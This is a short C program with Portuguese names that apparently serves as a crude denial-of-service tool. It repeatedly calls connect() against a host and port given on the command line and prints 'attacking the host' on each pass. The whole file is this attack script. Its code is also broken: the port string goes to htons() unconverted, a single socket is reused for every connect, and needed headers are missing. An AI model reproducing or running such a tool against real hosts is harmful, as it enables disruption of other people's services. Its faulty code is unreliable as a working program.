#include <stdio.h>
#include <netdb.h>

main(int argc, char * argv[])
{
   int meusocket;
   int conecta;
   char * host;
   char * porta;
   host = argv[1];
   porta = argv[2];


   struct sockaddr_in alvo;
   meusocket = socket(AF_INET, SOCK_STREAM, 0);
   alvo.sin_family = AF_INET;
   alvo.sin_port = htons(porta);
   alvo.sin_addr.s_addr = inet_addr(host);

   for(;;)
   {
   conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
   printf("Atacando o host %s na porta %s !\n", host, porta);
   }
}
